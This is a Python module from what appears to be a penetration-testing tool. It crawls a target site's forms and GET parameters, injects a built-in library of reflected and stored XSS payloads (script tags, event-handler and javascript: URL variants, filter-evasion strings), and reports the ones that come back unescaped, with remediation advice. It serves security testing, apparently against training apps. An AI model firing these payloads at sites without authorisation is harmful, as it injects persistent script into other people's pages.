# AutoPen XSS Scanner
# Detects Reflected and Stored Cross-Site Scripting
# Own detection logic - context aware payloads
# Tests discovered forms and GET parameters

import requests
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
from modules.recon.crawler import WebCrawler

console = Console()

# ─────────────────────────────────────────────
# OUR OWN XSS PAYLOAD LIBRARY
# ─────────────────────────────────────────────

REFLECTED_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "\" onmouseover=\"alert('XSS')",
    "' onmouseover='alert('XSS')",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<img src=\"javascript:alert('XSS')\">",
    "javascript:alert('XSS')",
    "<a href=\"javascript:alert('XSS')\">click</a>",
]

STORED_XSS_PAYLOADS = [
    "<script>alert('StoredXSS')</script>",
    "<img src=x onerror=alert('StoredXSS')>",
    "<svg onload=alert('StoredXSS')>",
    "\" onmouseover=\"alert('StoredXSS')",
]

XSS_SIGNATURES = [
    "<script>alert('xss')</script>",
    "<script>alert(1)</script>",
    "<script>alert('storedxss')</script>",
    "onerror=alert('xss')",
    "onerror=alert(1)",
    "onload=alert('xss')",
    "onload=alert('storedxss')",
    "onmouseover=\"alert('xss')",
    "onfocus=\"alert(1)\"",
    "javascript:alert('xss')",
    "onerror=alert('storedxss')",
    "onload=alert('storedxss')",
]


def is_internal_target(url: str, target_ip: str) -> bool:
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ''
        if not host:
            return False
        return host == target_ip or host.endswith(target_ip)
    except Exception:
        return False


def is_valid_xss_target(url: str, param: str) -> bool:
    url_lower = url.lower()
    if not param or param.strip() == '':
        return False
    if 'phpinfo' in url_lower:
        return False
    if 'logout' in url_lower:
        return False
    if param == 'page' and ('mutillidae' in url_lower):
        return False
    return True


class XSSScanner:
    def __init__(self, config: dict, logger, validator):
        self.target_ip = config['target']['host']
        self.base_url = f"http://{self.target_ip}"
        self.target_url = config['target']['url']
        self.username = config['target'].get('username')
        self.password = config['target'].get('password')
        self.timeout = config['scan']['timeout']
        self.logger = logger
        self.validator = validator
        self.findings = []
        self.tested_targets = set()  # dedup tracker
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config['scan']['user_agent']
        })
        self.config = config

    def run(self, crawl_results=None) -> list:
        """Main XSS scan function"""
        console.print(Panel(
            "[bold yellow]PHASE 4: XSS DETECTION[/bold yellow]\n"
            f"Target: [bold white]{self.target_ip}[/bold white]\n"
            "Testing for Reflected and Stored XSS...",
            style="yellow"
        ))

        if not self.validator.is_host_in_scope(self.target_ip):
            console.print("[bold red]Target out of scope. Scan blocked.[/bold red]")
            return []

        # Authentication is handled by the shared session in main.py if provided

        if crawl_results is None:
            console.print("\n[cyan]Crawling for XSS points...[/cyan]")
            crawler = WebCrawler(self.config, self.logger, self.session)
            crawl_results = crawler.run()
        else:
            console.print("\n[cyan]Using shared crawler results.[/cyan]")

        get_params = crawl_results['get_params']
        forms = crawl_results['forms']

        # ── Crawler-discovered GET parameters ──
        if get_params:
            console.print(f"\n[cyan]Testing {len(get_params)} GET parameters for Reflected XSS...[/cyan]")
            for target in get_params:
                if not is_internal_target(target['url'], self.target_ip):
                    continue
                if not is_valid_xss_target(target['url'], target['param']):
                    continue
                dedup_key = f"{target['url']}::{target['param']}"
                if dedup_key in self.tested_targets:
                    continue
                self.tested_targets.add(dedup_key)
                console.print(f"\n[cyan]Testing:[/cyan] {target['url'][-60:]}")
                console.print(f"[cyan]Parameter:[/cyan] {target['param']}")
                self._run_reflected_xss_scan(target['url'], target['param'])

        # ── Crawler-discovered forms ──
        if forms:
            console.print(f"\n[cyan]Testing {len(forms)} forms for XSS...[/cyan]")
            for form in forms:
                if not is_internal_target(form['action'], self.target_ip):
                    continue
                for input_field in form['inputs']:
                    if input_field['type'] in ['hidden']:
                        continue
                    if not is_valid_xss_target(form['action'], input_field['name']):
                        continue
                    dedup_key = f"{form['action']}::{input_field['name']}"
                    if dedup_key in self.tested_targets:
                        continue
                    self.tested_targets.add(dedup_key)
                    console.print(f"\n[cyan]Testing form:[/cyan] {form['action'][-60:]}")
                    console.print(f"[cyan]Field:[/cyan] {input_field['name']}")

                    if form['method'] == 'GET':
                        self._run_reflected_xss_scan(
                            form['action'],
                            input_field['name']
                        )
                    else:
                        self._run_stored_xss_scan(
                            form['action'],
                            input_field['name'],
                            {i['name']: i['value'] for i in form['inputs']}
                        )

        # Scans complete

        self._display_results()
        return self.findings

    # DVWA specific methods removed

    def _run_reflected_xss_scan(self, url: str, param: str):
        """
        Reflected XSS detection.
        Send payload via GET, check if it appears unmodified in response.
        """
        console.print(
            f"  [yellow]→ Reflected XSS ({len(REFLECTED_XSS_PAYLOADS)} payloads)[/yellow]"
        )
        found = False

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Testing {task.completed}/{task.total}[/cyan]"),
            BarColumn(),
            transient=True
        ) as progress:
            task = progress.add_task("scanning", total=len(REFLECTED_XSS_PAYLOADS))

            for payload in REFLECTED_XSS_PAYLOADS:
                if found:
                    break
                try:
                    response = self.session.get(
                        url,
                        params={param: payload},
                        timeout=self.timeout
                    )
                    self.logger.log_request('GET', url, response.status_code)
                    response_lower = response.text.lower()

                    for signature in XSS_SIGNATURES:
                        if signature.lower() in response_lower:
                            finding = self._create_finding(
                                vuln_type='Reflected XSS',
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=(
                                    f"Payload reflected in response unmodified.\n"
                                    f"Payload: {payload}\n"
                                    f"Signature found: {signature}\n"
                                    f"Response length: {len(response.text)} bytes"
                                )
                            )
                            
                            # Dedup by param name + base path to avoid duplicate TWiki findings
                            dedup_key = f"{param}::{url.split('?')[0]}"
                            if dedup_key in self.tested_targets:
                                found = True
                                break
                            self.tested_targets.add(dedup_key)
                            
                            self.findings.append(finding)
                            self.logger.log_finding('Reflected XSS', url, 'HIGH')
                            console.print(
                                f"  [bold red]✗ VULNERABLE[/bold red] — Reflected XSS!\n"
                                f"  [red]Payload:[/red] {payload[:50]}\n"
                                f"  [red]Reflected:[/red] {signature[:50]}"
                            )
                            found = True
                            break

                    time.sleep(0.1)

                except Exception as e:
                    self.logger.log_error('reflected_xss', str(e))

                progress.advance(task)

        if not found:
            console.print(f"  [green]✓ No reflected XSS[/green]")

    def _run_stored_xss_scan(self, url: str, param: str,
                              form_data: dict, display_url: str = None):
        """
        Stored XSS detection.
        Submit payload via POST then GET the display page
        and check if the payload persists in the response.
        display_url overrides which page is checked for persistence.
        """
        console.print(
            f"  [yellow]→ Stored XSS ({len(STORED_XSS_PAYLOADS)} payloads)[/yellow]"
        )
        found = False

        for payload in STORED_XSS_PAYLOADS:
            if found:
                break
            try:
                # Submit payload
                data = form_data.copy()
                data[param] = payload

                post_response = self.session.post(
                    url,
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                self.logger.log_request('POST', url, post_response.status_code)
                time.sleep(0.5)

                # Build check URL list
                # display_url takes priority — it's the page where
                # stored content is rendered back to the user
                pages_to_check = []

                if display_url:
                    pages_to_check.append(display_url)
                else:
                    pages_to_check.append(url)

                # Shared page detection
                if url not in pages_to_check:
                    pages_to_check.append(url)

                # Mutillidae blog — view page is separate from submit page
                if 'add-to-your-blog' in url:
                    view_url = url.replace(
                        'add-to-your-blog', 'view-someones-blog'
                    )
                    if view_url not in pages_to_check:
                        pages_to_check.append(view_url)

                for check_url in pages_to_check:
                    try:
                        check_response = self.session.get(
                            check_url,
                            timeout=self.timeout
                        )
                        response_lower = check_response.text.lower()

                        for signature in XSS_SIGNATURES:
                            if signature.lower() in response_lower:
                                finding = self._create_finding(
                                    vuln_type='Stored XSS',
                                    url=url,
                                    parameter=param,
                                    payload=payload,
                                    evidence=(
                                        f"Payload persists on page after submission.\n"
                                        f"Submitted to: {url}\n"
                                        f"Found on: {check_url}\n"
                                        f"Payload: {payload}\n"
                                        f"Signature: {signature}"
                                    )
                                )
                                self.findings.append(finding)
                                self.logger.log_finding('Stored XSS', url, 'HIGH')
                                console.print(
                                    f"  [bold red]✗ VULNERABLE[/bold red] — Stored XSS!\n"
                                    f"  [red]Payload:[/red] {payload[:50]}\n"
                                    f"  [red]Found on:[/red] {check_url[-50:]}"
                                )
                                found = True
                                break
                        if found:
                            break
                    except Exception:
                        pass

                time.sleep(0.1)

            except Exception as e:
                self.logger.log_error('stored_xss', str(e))

        if not found:
            console.print(f"  [green]✓ No stored XSS[/green]")

    def _create_finding(self, vuln_type: str, url: str,
                        parameter: str, payload: str, evidence: str) -> dict:
        cvss = 6.1 if vuln_type == 'Reflected XSS' else 8.0
        return {
            'title': f"{vuln_type} in parameter '{parameter}'",
            'type': 'xss',
            'vuln_type': vuln_type,
            'target': url,
            'parameter': parameter,
            'payload': payload,
            'severity': 'HIGH' if vuln_type == 'Stored XSS' else 'MEDIUM',
            'cvss_score': cvss,
            'description': (
                f"{vuln_type} detected in parameter '{parameter}'.\n"
                f"Attacker can inject malicious scripts that execute "
                f"in victims browsers, enabling session hijacking, "
                f"credential theft, and malware distribution."
            ),
            'evidence': evidence,
            'remediation': (
                "1. Encode all user output using htmlspecialchars().\n"
                "2. Implement Content Security Policy (CSP) headers.\n"
                "3. Validate and sanitize all user input server-side.\n"
                "4. Use modern frameworks with built-in XSS protection.\n"
                "5. Set HttpOnly and Secure flags on session cookies."
            ),
            'references': [
                'https://owasp.org/www-community/attacks/xss/',
                'CWE-79: Improper Neutralization of Input During Web Page Generation'
            ],
            'discovered_at': datetime.now().isoformat()
        }

    def _display_results(self):
        console.print(f"\n[bold white]XSS Scan Complete.[/bold white]")

        if not self.findings:
            console.print("[bold green]✓ No XSS vulnerabilities found.[/bold green]")
            return

        table = Table(title="XSS Findings", box=box.ROUNDED, style="yellow")
        table.add_column("Type", style="bold white", width=20)
        table.add_column("Parameter", style="cyan", width=15)
        table.add_column("Severity", style="bold", width=10)
        table.add_column("CVSS", style="bold", width=6)

        severity_colors = {"HIGH": "red", "MEDIUM": "yellow"}
        for f in self.findings:
            color = severity_colors.get(f['severity'], 'white')
            table.add_row(
                f['vuln_type'],
                f['parameter'],
                f"[{color}]{f['severity']}[/{color}]",
                str(f['cvss_score'])
            )

        console.print(table)
        console.print(f"[bold yellow]Total XSS Findings: {len(self.findings)}[/bold yellow]")
